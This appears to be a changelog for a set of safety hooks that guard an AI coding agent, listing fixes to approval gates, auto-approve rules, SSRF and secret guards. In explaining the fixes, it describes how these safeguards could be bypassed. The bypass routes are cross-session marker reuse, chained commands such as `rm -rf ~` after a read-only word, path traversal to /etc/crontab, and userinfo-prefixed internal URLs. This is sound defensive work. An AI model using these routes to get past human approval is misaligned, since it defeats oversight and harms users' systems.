- [2.21.8] - 2026-07-22 — fix(reliability): **dep-vuln-scanner no longer goes inert on large projects.** After an install command the scanner ran `npm audit --json` / `pip-audit --format json` and passed the whole JSON blob to python as **`sys.argv[1]`**. On a big project that output easily exceeds `ARG_MAX` (and a single argv string >128 KB already fails on Linux) → exec raises "Argument list too long" → python never runs → the `2>/dev/null || echo ""` swallows it → findings are **silently empty exactly where vulnerabilities are most likely**. Now the audit JSON is piped via **stdin** (`sys.stdin.read()`), which has no size limit. +1 test (a fake `npm` emitting a >1 MB audit with a critical vuln still surfaces the finding). Full suite 1747/0.

- [2.21.7] - 2026-07-22 — fix(security): **sub-agent safety rules now reach EVERY sub-agent, not just the first.** `subagent-safety` gated its mandatory-rules injection behind a session-scoped flag (`.subagent-safety-injected-<sid>`), so only the **first** sub-agent spawned in a session actually received the rules. Every sibling/nested sub-agent after it hit the flag and got a dangling *"rules already in scope (see prior injection)"* reference — but each sub-agent is an **independent context** that never saw that prior injection, so #2..N ran effectively unguarded (no force-push / rm-rf / sudo / writes-outside-project / read-before-modify guidance). Since each context is injected exactly once regardless of the flag, there was nothing to dedup: now the **full** rules inject on every SubagentStart. Dropped the flag and the now-dead session_id parse (one fewer jq fork per spawn). +4 tests (first spawn has the rules; second same-session spawn STILL has them, not the stub; no flag file written). Full suite 1746/0.

- [2.21.6] - 2026-07-22 — fix(parity): **destructive-prompt-scanner now actually checks the database class it advertises.** The Bash fast-path gate listed DB keywords (drop-table, truncate-table, lowercase variants…), but the python body had **zero** DB patterns — so those prompts entered python, matched nothing, and exited with no warning, while `safety.sh` blocks the same class on the Bash channel. The gate was advertising a check that did not exist. Added DB-destruction patterns to the python body mirroring `safety.sh` DB_PATTERNS — drop/truncate of table/database/schema, and delete-without-WHERE (positive-shape, so a delete *with* a WHERE clause never fires), plus ORM schema-drop/reset (`drizzle-kit push --force`, `prisma db push --force`, `prisma migrate reset`, `typeorm schema:drop`, `sequelize db:drop`) — and added the missing fast-path keywords (delete-from, `prisma`, `drizzle`, `typeorm`, `sequelize`) so those prompts actually reach the body (the code's own comment warned any body pattern needs a matching gate keyword or it is unreachable). Advisory only (adds context, never blocks). +5 tests. Full suite 1742/0.

- [2.21.5] - 2026-07-22 — fix(reliability): **prompt-secret-guard no longer fails CLOSED.** The guard (set -uo pipefail) sourced `lib-secret-patterns.sh` then built `COMBINED_PATTERN` from `${SECRET_PATTERNS[*]}`. If the lib was missing/unreadable (broken install), `SECRET_PATTERNS` was unset → under `set -u` the subshell emptied `COMBINED_PATTERN` → `grep -qE ""` matched **every** prompt → `exit 2` **blocked every prompt** — the exact opposite of the guard's documented "fully fail-open" contract, and the same install-integrity class as the 2.17.3 phantom-deny. Now the source is guarded (`|| exit 0`), the array expansion is `:-`-safe, and an empty pattern set exits 0 — the guard never blocks a prompt just because its pattern lib is unavailable. Real credential detection is unchanged (a prompt with a live-key shape still blocks with the lib present). +1 test (hook copied without its lib → exits 0, not 2). Full suite 1737/0.

- [2.21.4] - 2026-07-22 — fix(security): **human-approval gate no longer bypassable across sessions.** The one-time "already asked" marker (`.gate-pending-<hash>`) was keyed on the command hash **alone**, in the shared global scope dir. So a second concurrent session — or another project — running the *same* high-risk command (SQL DDL, `git reset --hard`, `terraform destroy`, `kubectl delete`, `dd`/`mkfs`, publish, redis flush …) found session A's pending marker, consumed it, and was **allowed through without its own user ever being prompted** — a silent bypass of a security approval gate, and an instance of the recurring global-filename session-leak class. Now the marker is suffixed with the session id (`.gate-pending-<sid>-<hash>`), so each session must clear its own gate; `session-end` cleans this session's markers. +3 tests (first call blocks, same-session retry allowed, different session still blocked). Full suite 1736/0.

- [2.21.3] - 2026-07-22 — fix(security): **playwright/puppeteer SSRF userinfo-@ bypass closed.** `mcp-playwright-guard` stripped the URL scheme and matched the host against start-anchored private/localhost globs (`10.*`, `127.*`, …), but left any `user@` prefix in place — so `browser_navigate` to `http://user@10.0.0.5/admin` or `http://x@127.0.0.1/` yielded a host of `user@10.0.0.5`, which missed the anchored deny and was allowed (SSRF to internal services / RFC1918). Fixed by isolating the authority (everything up to the first `/`, so a `/@x` in the PATH is not mistaken for userinfo) and stripping `user:pass@` before the host match. This is the same userinfo-@ class `lib-egress-patterns.sh` was already hardened for — playwright-guard hand-rolled its own host match and never got the fix. +8 tests (userinfo bypass on 10.x/127.x/metadata denied; public `/@handle` path still allowed; the tricky `10.0.0.5/@x` still denied). Full suite 1733/0.

- [2.21.2] - 2026-07-22 — fix(security): **MCP deny paths no longer fail open.** Three MCP guards built their deny-reason JSON with an unguarded `RSN=$(… python3 …)` under `set -euo pipefail`. If python3 was absent or crashed, the assignment aborted the `deny()` function BEFORE the deny JSON + `exit 2` ran — so Claude Code treated the call as a non-blocking error and **ALLOWED the destructive operation**: a GitHub merge/delete (`mcp-github-write-gate`), an SSRF/eval browser call (`mcp-playwright-guard`), or a destructive SQL verb (`mcp-sql-guard`). Now the reason capture falls back to a constant on python failure so the deny + `exit 2` always fire (the full reason is already on stderr). Fail-**closed** on the deny path, as a block must be. +6 tests (each guard still denies with real python, and still blocks with python3 shimmed to fail). Full suite 1725/0.

- [2.21.1] - 2026-07-22 — fix(reliability): **phantom-deny sweep — python-absent no longer breaks the edit channel.** The audit found the exact 2.17.3 regression class live in two more guards: an unguarded `VAR=$(python3 heredoc …)` captured under `set -euo pipefail`. When python3 is missing or crashes, the assignment exits non-zero and (via `set -e`) aborts the hook with **empty stderr** — which Claude Code renders as a bogus `hook error: No stderr output` **deny on every Write/Edit**. Hardened three captures to fail **open** (allow), matching the 2.17.3 safety.sh precedent: `path-guard.sh` (main `REASON` check + the `CONFIG_ROOT` resolver), `memory-write-guard.sh` (`RESULT` — `2>/dev/null` hid stderr but the non-zero still tripped `set -e`), and `safety.sh` (`CMD=$(normalize_cmd …)`, now guarded like the `SEGMENTS` line below it). Deny path stays intact — a write to a system path still denies with real python. +4 tests. Full suite 1719/0.

- [2.21.0] - 2026-07-22 — fix(security): **smart-approve fail-open hardening — the auto-approve verdict no longer waves through two escape hatches.** `lib-smart-approve.sh` decides which tool calls autopilot (and the notification-skip path) can approve without prompting; a multi-hook audit found it fails **open** two ways. (1) **Compound commands / redirection.** The Bash allow-list anchors only the *leading* token (`^\s*(ls|cat|grep|find|…)`), and the sole metacharacter gate blocked only `$(…)`/backticks — so `grep x . && rm -rf ~`, `cat foo > ~/.bashrc`, and `find . | xargs rm` were auto-approved on the strength of their first read-only word, skipping the user's confirmation. Now **any** control operator (`;`, `&`, `|`), redirection (`<`, `>`), or newline defers to the prompt — a genuinely read-only command needs none. (2) **Path traversal.** The Write/Edit in-project check built `abs_path` by *string concatenation* (`$project_dir/$file_path`) with no normalization, so a relative `../../../../etc/crontab` yielded `$project_dir/../../../../etc/crontab`, which still glob-matched `$project_dir/*` → an out-of-project write auto-approved. Now any `..` path component is refused before the prefix test. The PreToolUse safety floor already blocked the *destructive* payloads regardless; this closes the gap where the **prompt itself** was silently skipped. +9 tests (both exploits denied, plain read-only + in-project writes still approve). Suite green.
